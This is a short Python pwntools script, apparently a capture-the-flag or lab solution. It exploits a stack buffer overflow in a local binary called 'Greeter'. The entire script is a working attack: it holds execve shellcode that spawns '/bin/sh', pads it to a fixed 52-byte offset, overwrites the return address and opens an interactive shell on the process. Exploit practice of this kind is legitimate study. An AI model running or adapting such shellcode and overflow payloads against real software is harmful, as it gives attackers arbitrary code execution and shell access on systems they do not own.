from pwn import *
import struct
import sys

SHELLCODE = (
            b'\x31\xc0\x50\x68\x2f\x2f\x73'
            b'\x68\x68\x2f\x62\x69\x6e\x89'
            b'\xe3\x89\xc1\x89\xc2\xb0\x0b'
            b'\xcd\x80\x31\xc0\x40\xcd\x80'
        )

OFFSET = 52

RETURN_ADDR = struct.pack("I", 0x080e6ca0)  
junk = b"A" * (OFFSET - len(SHELLCODE)) 
payload = SHELLCODE + junk + RETURN_ADDR + b"\n"

# Save payload to file
with open("exploit", "wb") as f:
    f.write(payload)

p = process("./Greeter")
p.sendline(payload)
p.interactive()
